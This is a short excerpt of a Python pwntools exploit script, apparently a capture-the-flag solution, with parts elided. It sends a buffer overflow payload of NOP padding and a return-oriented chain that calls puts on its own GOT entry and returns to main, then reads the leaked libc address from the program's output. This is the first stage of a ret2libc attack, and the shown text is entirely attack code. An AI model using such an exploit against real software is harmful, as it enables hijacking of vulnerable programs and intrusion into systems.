...
def exploit(remote):
    ...
    try:
        ...
        payload = b'\x90'*60 + \
            pwn.p32(puts_plt) + pwn.p32(elf.sym["main"]) + pwn.p32(puts_got)
        pr.sendlineafter(b"Input some text: ", payload)
        pr.readuntil(b'Return address: ')
        pr.readline()
        pr.readline()
        puts_addr = int.from_bytes(
            pr.read(4).strip().ljust(4, b'\x00'), 'little')
